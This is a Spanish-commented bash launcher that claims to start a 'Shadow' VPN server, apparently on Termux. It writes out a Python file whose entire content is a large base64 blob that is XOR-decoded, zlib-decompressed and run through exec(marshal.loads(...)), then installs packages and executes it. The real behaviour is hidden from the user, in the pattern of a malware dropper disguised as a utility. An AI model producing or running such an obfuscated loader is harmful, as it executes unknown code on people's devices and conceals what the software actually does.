#!/bin/bash

# ==========================================
# SHADOW OPERATOR LAUNCHER | VPN SDC SERVER
# ==========================================

SCRIPT_TARGET="vpn_local_server_sdc.py"
export DEBIAN_FRONTEND=noninteractive

# Colores
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_msg() { echo -e "${2}[${1}] ${3}${NC}"; }

# --- 1. GENERACIÓN DEL PAYLOAD (Self-Extracting) ---
generate_payload() {
    log_msg "SYSTEM" "$CYAN" "Verificando integridad del núcleo..."
    if [ -f "$SCRIPT_TARGET" ]; then
        log_msg "CHECK" "$VERDE" "Núcleo $SCRIPT_TARGET detectado localmente."
    else
        log_msg "GEN" "$AMARILLO" "Núcleo no detectado. Materializando $SCRIPT_TARGET (ULTRA SECURE)..."
        
        # INICIO DEL BLOQUE PYTHON PROTEGIDO V2
        cat << 'EOF' > "$SCRIPT_TARGET"
# SHADOW PROTECTED
import zlib as Suofeg, base64 as YDsqGI, marshal as FtDCbm
FANNaz = 124
FbHzOj = YDsqGI.b64decode('BKcbxUlqvl76WnF6tX5UrPYjCqu+SbJIP50EH+oxO/CoW87cd/3/wPPQs60OT9M1p/AWrjMCuuvqkP2Yq7ubYllyLsOtZf5Y6HcUiWileHmHR9ONhIE153MaAqsWPqeFszUhLAseER8U+gxYElYECVMWpFFinj+kBBiZHRd7ZQexAC3gZst0xfLZeq02o3X35mEy2V7stHvq2bD4LvQlI8Hx0PP+2qxJ+fGY0NM99M6yynDBRs3m20tLytlOZWSDwcTa93641Tq6ARifFsW0pbizmIekCQwLqqTsp69NZKHXIa2rDt2fnhqBm6US1LTWsvE6D54d3AnCCdyGuKUVMwKNQA5+fVRbO0joef5VdU+ndViPbX68ai9vYo9kxx1V4mRqZULxD3RclT02U+uncU1GNjGxfd3g7I74/8F2p+36R7Fa5Jpg628qdw3fL/GJDUm6dinAEAwBI5FyM7YtyKAScf3V6X371gJar010CcfbvH4Yz7V+8GTEzJp2gCB4zQgozdMvXPWMYQ9fJ3JDeLiS/XmoH4kiql68RjdUViHYJQ2WM8aQgvZOx3RmDlZI7f57XyLBDSZO/nuz24vV5gTaAA2cpcC9rGnZjMNBVytgA9QCHQ7Ty29gu/VHa9Y9V1lnyep7ee7Bi+nYVKfYxJpI8ezoy52rw+s9WUdF4dBk1VYHJxOpTo2IBMLrwNu8uBkIxhvlAwtq14cY6sPdoHa0A6RMZpXuSTtNr7+q7bEM5I7QgnWFLUaeX21ksEopucgPW5aADV8ZcK9vUlygZBCU8omZq5xHM+Lqttnl6V+kGE3D6/QtUZ1NAefx0pXNgB6nRjyKm+oLkfzv0SEUedVUria5leAii4dmQdN7f7CroWiF9KEfg97ZO1BjNbGwcwaZvigY9S/2Yp3e++Ro9hmpk/1NiDYSoSK+07pvk6NvdIfPEJ1XbPXrez4a7ipWFsTmpKN3RBVjb1rUf65OfGjVIo+lJzI90QseRGWYIjcVZT1BDlY8cu1wKG9guD4oVgOrhR4cTwP9Ni/K4Ytrn2nfkLWY2uta6dKkXsa7wv43l27bd7EhqTes9R1xeLMuW1SZKsIYsfWHsY23dQv7JOdHuUrfShhjg9xY57a7/8U3XM8rCKGkrR6hKnOMTHf5Pj764SxBbWlfMguATmWBkl3eQ7e3qvO0J8CY2bO7SfdFQvlZA+uksgNHPDlmMfaPxl7GEijlRMhRg7aY8dpYWLIjl86AdbQZJfjMDMLW4crkp4GOlmm6H056s3yLAfJ8OuvA9+PHb7WkC5PNziDIFO6iP+krfDOGWd66AT5UQRw2dxzuZYr4B0mnihLmFD919M3u6tMQT3JGthCSQl5/11nfL33HGv2DukwvBLTuUDc85rO7k8fzADK/3FTL298OecGLnzS2eeDzgpVRq+OCi1wfDqBZOE8WvOeyatx1nHHVV+rzQkrQomc04u0QaORRyxpOnh8nZNCLLGopxVPbbNuLMN5sAu1zZWqznbXe+rtqIgQA/ML7y+h/WBD5lPiUxv4K7tvKZ7HiBGlMiNWlw4Eh0jC84btHq0PgR5R3f3GNCT5dxs5csVJnPdZssKYx3gIQ1beYDym6gP/9JEajT03W6WP1R/1jVMcGNAxc1hco0HeMzpOuCjFvz2z2N9gS5FfkP006qmho+0j9gu6ReQ+ccEecKMexV7KxjlkvRenqER1i7bJMHL3iU28IrL4UQ2oSOi8MRFn/LbxDIO1gg8inM22wyy7Rg4AHClcmAi7mTYrQFlSVPWsTm0n+etzCWI8ukVcaedbC3FyNV5Y1DK/VQvEma3aEl/KOwm2k5lmZDXP1Undk/5NRobaV/GxioQEPxOrqIHkpPTLy79CRFGZFFlMr0OcIHEGlizzPHyrb6jR+HxiXKGba6EPciblsS3BLvnB+azcgNFFG+6pBQWI0L8lzFX2O9jnY5WSt1ybNzstv8TQY+7eJA3IL/exq84jsNlZhwzXyrCa8zMuvYMDxnpk/McsCDptty7v2ZJvc/Pg2I5jBBTOlP2ndgrnNllCp7yOVvVJ7tfQ5Id+YmJPjJhfsObeoQrKh3UG6GhzDxcgCVSopj4nyUYCRLTbez1KOt8gGxN8V8IvRLb2pK0DqZDvnQwiSI0onaHKes/XayosvBkh4WSytQao3o0vhirJ7kzZpgjclgbsU1ounBktzlBUSwv0NCODownTzjfTHlYXFTo701tlpkBBbzeGf2gmThIG4q/Qai6PV8nME95PV1bW9JF/YxQAZztnoEvr9Fz2P5E2jEaic8JiARf/td9+Ih4bMy9JtI3Dlh2kQv9hG511kEvUYF5ZoB4DE3WzYx9rvJeg4mO1TuhYFLto9aN6QFjyhH6hp1OQOVJ6egW6j+GOOvLg6yRagmGPHwR4iHei0EJUf6GRsv/DM3LBz8q/iqlaiNaywqghIg22oXk7N1+QnXxq4IzS16pO9Hjnn46mFRfjwUrBpwUCML59c2Xfn4JlV5KOViSDqgffM/Swc6HV05OHMBYSVLbZl7rBss9S4pyrWHepzWSgBp9t9QrevFNHWNjKAjKVyEVx0p7z9d/9EvAGXZJ1O/0JBod5hv6Wd8GBf3dBT42/bI7ySgyapJOaTVvhX5X+RS7JFAdgXk+qzjFx6Y6DrXgyNGSmMIQV9SKDEyusV9pDcq+q1iRTuhl0bDU7r/2GZqMXapkskV9GxwvD8JWUMRxCeOttPyPC22uC/WS8bz5gC5Mjj1x4jvPNShsQxzviKteZrM/rctqvS4PknSLFwfJrT91pTQNq8MdCnBXH+PujMf878zB5i3107YAcs2XDyQk+eOPf90dRSCVMTrMPrYtdTrL+BvbMlnMAKLi1mkb3ggTRFaIyQlJP0meD8kUBYrGyh0QkXX3DdK3CpyK3/KksqypIYfbf9oOTYnFl0ouoySvkzh7qKlHj2H52NkbLDQYpIWkL/hC4ad/WgDd4eCAfDzIyxRBhJ0frj1oo4X+eMQBO86IQi8nSUCy3jzdfXXc3AkA5UR1RSv/z+trWRgVbuioAg892vWq08t2tLoqHau5vCAWzotQLFny0ekCswVVD1QlWi+Ba7szh55xUtrnUWvq+TFg5tN9Gg2lufWHNWVLdsvSwNV33EkKtE7rRNGc6smsKvT9GG4QxKqMLhj2v+qmVNHHDX2vgCPxtqLigcVeoLM3KfWfGVB5HrWwc0/xpW6zbWDuAbrLXXUqUx1Y7T5l2DqS7oZCGjHm1oXPTeRt5vgMNR+nxJdvCq+S44GCfqGy3WvutBtZmMUaYFj/494kIQJ+AuKK+qpPTrnqybtshyIpyc/Xy/T/e6/nKOFtEBx64nNn/nONzzt96sLCE4ngLQhKdiEOw7jWIHCvl4jQ0GxzvPIcj6YtltNy1l/KTCRVXnvEksgGv8JMBLIv54Pe0HUrG2rX8bFCvBBsnmjHzf6WN5E4zE55M/5kIgyd99x44MpKbR7ThU924O7xP5q19/YyNEg97FKjnXZzwDF6ol36h+Em4YFYfHV2ZQYQ0Ez4dFPmQql6M63k0iN0FsxjWIN+GJ4A0dnqDqZPuvPpnEYc5SSx5WgVk0EtsWfFQmLufSu7RlDpakBAu7uUVDkwci2tJS6i/UzIGxE5cBTSfzDl4jNPTkKYGPVDy17EtZ/Mg23HZjOcHJMmRsMe5jvCPlQx9JvJCIdY4P26olVg5w591WnzgxOlBkrTKcN0KJYnKhrscemsEg0cRcTSpitJPyoI6qbOXo/xrM9YDroFdPOduZxro/PNEOrti405lSh0pJ/aCS7hO/V5OL7+6/iYbxZbV9dIy12tkI39af+gw6ga9vRN1ncQKCOB2muCLeO9eb4ckZpsrax1A/gvgUHiD2FBv7hFS8LEme0RVemDomMNCw8vyvUj+eQoe4ILTyKLAu7eK2zQ/t8rZP1wG9QGRsAe74hjIngk9k7H/MfHloc+ZE1VJvIg148zUiW94npGE/mrK999Jn/YnvTCODeCX8g43HDAKJB6fm3+hfAiB/5CUi1yXSt3e1KFa/lUeczmkr7LsdsCN3Dlly/x9oVqFxUNfMBqEc2/omqNFz5bCOjoaJcZ3xNniT/k+gKZ8AF8QzaaLu/3QJKumiGvQMCqjlGMZYdpqw93aibH1jQdIDP+OH8q5C5higyUR697v3lEeqzIoa4/E2JbW9CEMKgNjwGXKmOcXb8dYOt/iIKAjOhjJXfwrju1jj9KMAOT/D4tHjUkFL9nZLnQ/VAVaOpSkzp35C5S6yuFLXdTs9mJA5OVA4NbKrY+8VQxbno4rBlvZX018ysAVv0Ogfxx5TFEwW3Rf0ghHIUfXjnnYzrud2AIBzkvSUu7rRoe7m2dN18GDUTs5Xo8e80M2y5/Jklz1PPSbyCo0qy90ASuYvldclXWkoNLp8IVXMb01FmMj9BFJEmm94/CJznZCNhz+jXZiF6jNUFgM+waS3ufed5Mu6NptLevAFNnRZDlRz8yoWcVAZEveGWZ0HgBHpNvlFA4dHVJ734jLYM0UWxQaMzxIW+vU8B7N2JeAaNI9auddL96y7NlTX6AVDAnMhrI6RWP8emMUlidDu9XRkEmGQUHgqLA08KrD5GJPFLQAn+xuyLo2rK2jQi7eGObY5j84BqoCCIHEse1bR6MyiY2kF8NyZe2tUOJlh2UPs76yN0X6R75oH72uAvWTjENoEr8vAj866Dy+VszYFGrDAyFmTqewpf/FjAzqDA0p7rERrlWIhYnUFIjFiMpV/qmGRmD3+BEifbjsc30Lw05SHwDbLp4lDlz/ElsTCHYKcZt02Fva/ZV6OKvXUEc1s0sqdCJVoShZxgMsGmKJYtYGpmWeVFmHtrwXe81plozOyBleJJf3ZqnVhMzCplt/LksJepkHxpBZCrqNP0kWdJQtvJEmFmq3apIW9stlyEiMAU8SjF6Zb7f90y5YfXqhf2fUzx3d9uqckb991pLJRCu59PHdVlQdeG7rfFswHu0h21YkNYoacyZKi9sbx4cxkAtMisY87gsgl2Q5rlj4/f+sgQq1xEsy6XrDQW/dba1Idz7hIpph8yd+2touCrRCFvi87sdmYucYUF2EuJgTgsCaOof1syedv0IpB8FwHZcDhqoSqI2mKxAYbmc0P+U1gD47z9qSCBQtFG2HDV8bNQnAIwu4/pTlaKvETOTI0aO1SL3puiFLO596m+rPzD9c8vJs7x3dyWvYAr6dGfTPVCjMdSlYjO4JPge8gmZLPulTZ7jkxyDFZuKfDGA9b1GzlmiYMseRGv/CTo/vJQCHdRtN+1l+vqsm2i0Yu2SMq98YtmTQQEUJYU9vbr+qq3yiUHeatYkricWiyqkanzst5+p7X1uNlv6lBgAgtccAiyVNT7vProbFKt4T2WEbKJ0wiyztJSLUzAZ90iIqO0Ocr3D253+Xow/svtsyPKsm2oaB/RsPw5dL+/hXtLfqB7rgMYCMdfA7HtFz20qjah1Pwwg6HHg/19ZOQTQaLk9YuIiLPEfkw8mNRyLAhh+RUBSvMZGRR4sMaASU3MZs13Xp6TpFTreTHuAeo0eSwcsOveiqbyXKoDOzv03nuNpgEQUAF1kDETOxRWwfnjbsQmV9whFsW3pC6BBaBQuA6zYgFdrdcXn/6PAch89dyaCKN4HirgEfwPSsT9epZ6JWGJwzk/gNyrmgkNct1uEwfvk0cft895/vIJZ/xr9bn1Ak1by3/RhBKP0AT86cpRAtR+bAiz4q+FsAizmbJxUrQTr11cAT2yl2I0elZYGMiit6znNGEB8RwT8iQQy9okweDvHlD+gL/66YJP1uIGGUeFg2hPmL/XXHGuAkf3d1b+EUDHKSc75ce5WTAuHewbSJQJwHjY6N+zcqWzGklDe38dKVjRKgJxOd2ioHVJg93Hw/JVwTaKIiWn3zv28bX/4DZWMy0zoCF/RYzFwMmhQeUvwcgbPus3InilmFfyUdY4Cn5sn7+x75K/cuXr47B4wHI1JKKskQ6LbeDJS1QJmmuQ1cxcbNG59G+0lIZevVVzBbXSSgo+7MfQVK5BNlDsvZfcUoJwqXtGn0KUQg/zSTcveH/WLzhyg/Pq7739RaHKZFWHgJOwMFdoDOtVa5UC59MV4jHdA7FMNLRgL/jVF6oDOwVLXnZKZPy7QV5MCOj6eHYBUtkAmTVE52JzwTNcX4z2tIBDc4VNz1Bow9dE93Hc5nSxFpQZVyAOFuC2EcjbjnPl391MLIOehPpvEENWe3keO2ttIZropUva36AAO83KiGL8xBOtdeDvxom/ZggduVHXVBHi6NsT2WvWycNDGzoHOyZZzLu1G8petQwgniycdz2mV7v6j+P9ymxL54sImbzjKTFLgJDhlgjNty+Cjb943b/Zg3ZQSlVTajHNEgGY+/YxPaIUtTj0qRZGKkcyW1vHlkwB42Pe3Y+41fsAdCgX1WCYq5MXLXyihuUzutiGCAoi0Ll3V8xfKtvlT5OYQPuk7URGBSQwsgvd4STqKHmIz2s/OInZ7uPkXtSXyUygHTeanza5A7NPVZggkr4SQsgzzZ79vG8WI2IdPmPdkaMJvMSJN3f/6MqcJii6GUNeWlSi9rATiaMZ2TLtl3tJjca18Wy/Q62xH/DuWyab9KXcGC4Mk/rHgygxEp5ZsJLmj9wC1x0+LvWgMoz+CPOh0U/rPtaKWBbzzoIWT4ELKEb5roivb7qBAtzSEdSE3MXysGNPtC/Ou8MH0dyuZkJxQry1VxOtZz2UmmOzgzwAKo6H3JyQOKPfObZVz+FLlCfzA6NdGUH2+ahDJb91OtOTkuLHirLNjBuasIeba539jDo5ozkgOSbMtxANNcQeWsmwP+YUih1L1TG8+sF7cQdxJ0AOfoZMJUuovgJ+0OndaHAGZJsVD+0QqVP41h4RRi4+NVwGL27dSSrnZABCbyrJiC/gtvEnxQcLNm4r+22l3KJZA8XeLi2n4e/tFBK705wVrBKT1Z+tCrKWMBROKeO+XoR+0nzAowFWbVlKe6H7WGEsmYvzEQS+hehHNiyKp2tqXO8kPeYIoX4/qQw6iJhCFrZzG6iQSbMHOxUYWSqFhQtPkD1jdeMireK7mBcMFj1hVbS7nieqDDvzkmNUpaqPAxc/Go0NSJaox/43zeYqjEJelrvEYy42areGkf8wgEJYzeymwXSfEfeOLh8a2wAmnNCf9qXjqSBRyGWlIxorV8KQkrMSLTfKHjqWPGAjmKPW3EfCU0wggdfmksuKhWX65qXDCMT3sMcJCZsnwel/RgC+r7f8ze6kz29kcP5Iwpj9DStBlXhhFJurteHH7WFL7SNYNCr8lMZT6UjUbJGafE56hOh6yjvEEMczEizdU6Y4Yf5qsPAz7eXVCS5aJj7sVsZcvzIJmgDNf7L0FWhG9tghgNyoPtxNwHLlIdd99DrS17gZsU9bgBHo+5j7pCDqIYWTGB/gJunBZmwRtZ/ZoI1sfEpwB26tFBxyxosGYPpNzJVNDFpSYpArZDowy9XYVwISi25RE9KzVGmmKbhYxU2nb0YX/aBxT7BCR+sysnqYwAFjroF+MOZqfo+NS1T+pIeKR7SrLe23CwVk/fmxjI4r+Rk8q6mueJCaMK1kwozz0G3q4kZyiIoVRJR+Bp67jXlGb+DogkK7J929gPAsxLFd8DmLbY4kQPkNm2R2u7l8k2LPF0e6CQuWuIcbWeEzlriaONAaheoCqgvRx7nt5/v6Gb4Tnp0J1Pz91VGE4vP/3fqLmRsWd7fI8HcFKavU7CnD76GTQG3h6NYFxJbCsfilB7UXnIfF8I180ZDtZBWY1nt/TPIEDc6RlC88pDb5n5NYXGOm5yePRuMdybxoAXOqNbZjIowTenpytxaAEVlB08f8krzGLqbvs2rI9KaPzn61xsxO9bCpawaIqmG4a1WJLzqdrDwgOhJp1AJR2mWY5G8UvbbNBOvhSjv7OEx4tQX+MKmcXcDw52KW2CQHlPt6vQ7Rvj3pdXmxR7MnTXLgFI27ueht5ZrxNvHGlSwkfECOCc8pEzvqWfSWNKJ1J5PERLKGKsAdg4mm65QjcGWzDio6jwc3trq/iCI0MKPPWSY0ObAeoEfj463CKy0iaUx8+P2SqfAHBAnfxDiZ3sYelxpY8Z57sq26cp+/cXq8OqMJQIDeMUj41IUMPcdBZGdgspaCrQ7T51I34WuWLK90O5XMlXxSIrAFUlGIya1AfZd1cUk1h1TY84ALH+csQtxA+cO+HxQ3OQibhv7n8mvgorc60S0BeAKQJ7kVQzFv+x8ExnJj0CmuU/w3HVzImcpjA6zuI74rQsuh5NK1fvXJbR23VaH0w3AmOQTQYjmqbhufDxSKBolakYvlWTglJIfJIT172b5h5ehZ0gBx8Jc5AMme/JeQxRiOJQNcyb95X1CjUO3nuRMMwzpcDEAWd3ywN99PR9Y0asAGljOjOPA749IMHTWo0P8Xd5YvyP0kD8NQijI3hCRTtY6wzspfSHm5jkjqqIraO6gAB5uxnHEeHHyQWFgYsHq54gJi+kWVubIecZwzlfvCmsOskVew5dcImsDGE2ChZws0uW6kKqtpfEJD6fTseqMs0cdM2C23Ibdet75OmeZso/9X+RKamu785pzce4DY8JmyqexVHB09X0YBYfjclyYm1nGtww3AgFlZnq0l+hj1nXlBTV3Rn4ItvqbQeZo8y8xGoJw9mKDlWAPljrNwo4+m78xXI/dNiIctBwTaUosvjpZ/CYGIBhZGmzO9gsI3dKwIxiYi1wmCRIKNv2NOQtU6tE9SEHrihrESnzUXnjNkqVAY6IuMoZX7MP6Cm99hmZ19MEeTEE8gDrN12L/Dd1t88Rd1GHpgyiFVbyL9FqELb3780v6FLReB1QZ95JaHB7ewMWdMJk5bnDHic2I7lAWaxuJNtT6UJ3V3cIdUoWFKBHstp5g3cblmin8eyfTufJVPlYdmW7nLduKavXqpgNw5Jf5rWprS6qzx+xRQNvq2oDxVr2/tspBicxEyM46CIEPB8DGgVQktU82PMGJzOvF3/P3D7AwnGxg9sYl53o1dwG9p/UwBzq7ImdhR0yRRhcNXuWK2GutM8KrSO4osy9/y0enc3xF0AiKqtMwarJZ+0Jc9qCgpMHc8iTtGOvKWjNRYD0cbfsfSOAXujJu1MmLOshHsSx98pj/VxYcSFsQSZattFRbhTHZcQYuEhyfiAKd5R+y0mKIlEvE6riMgAueDb3ccoeZjqam1YU25hy5cUpNbemA+XJ8R/DMWvLANLOZ+ersg/f6Pqo4fTPYLz85OD/aqDAfRoSWxSAmogRvKC85kN5A0BMJHG0CwT4JEo0hciaqczV2JWwaARqzHr28EMBj8Rd2gns4RO0xWW7uTU4u7SVm5UNvMvTi/C/IT2f2DHrJR/1mu9nL6bCWdijMzIaQOKvA/aTDyI5J2JM7vceqOLset7Jm1vL1uFIQhVyr7V+YLKP9q2Okr2ieELlED/aY9IGGlKYzC9DRlg4EZAuM5Rinx4dkI4KWqN9+akz7fSvY9XZttHBT8Xznbn4US25FiOZ2tSQiY6Cy31b1/PuawUNH119WU1NtwE8eTEwCSK07R44FmECUeEBPDz2jOuoZOTAS1awzMDbge64XLT0KLxinJGEkGUK+I18f/wIz2m4QaEZ1FQbikQoOAs0PWwoGuIYIAYQAYgPZLnz8S3r3/PeD9f4jjVHw/A7syLvq5OjmsoVn4bPmct74n7Lb3Mn3wObVFlazOzE=')
ZHwqkb = bytes([b ^ ((FANNaz + i) % 255) for i, b in enumerate(FbHzOj)])
exec(FtDCbm.loads(Suofeg.decompress(ZHwqkb))) 
EOF
        # FIN DEL BLOQUE PYTHON PROTEGIDO V2
        
        log_msg "SUCCESS" "$VERDE" "Núcleo materializado con cifrado SHADOW V2."
    fi
}

# --- 2. VERIFICACIÓN DE ENTORNO ---
check_env() {
    log_msg "SETUP" "$AMARILLO" "Verificando entorno de ejecución..."
    
    # Python
    if ! command -v python3 &> /dev/null; then
        log_msg "INSTALL" "$AMARILLO" "Instalando Python3..."
        pkg install python3 -y
    fi

    # Cryptography
    if ! python3 -c "import cryptography" &> /dev/null; then
        log_msg "INSTALL" "$CYAN" "Instalando librería 'cryptography'..."
        if ! pkg install python-cryptography -y; then
             log_msg "WARN" "$AMARILLO" "Fallo nativo. Intentando compilación..."
             pkg install build-essential openssl libffi rust binutils -y
             pip install cryptography
        fi
    fi
}

# --- 3. EJECUCIÓN ---
clear
echo -e "${CYAN}   ___  ___  _  __   ___  ___  ___ ${NC}"
echo -e "${CYAN}  / _ \/ _ \/ |/ /  / _ \/ _ \/ _ |${NC}"
echo -e "${CYAN} / // / ___/    /  / // / ___/ __ |${NC}"
echo -e "${CYAN}/____/_/   /_/|_/  /____/_/   /_/ |_|${NC}"
echo -e "${CYAN}       SHADOW INFRASTRUCTURE       ${NC}"
echo ""

generate_payload
check_env
log_msg "LAUNCH" "$VERDE" "Iniciando Servidor VPN SDC (Shadow V2)..."
echo -e "${CYAN}====================================================${NC}"
python3 "$SCRIPT_TARGET"
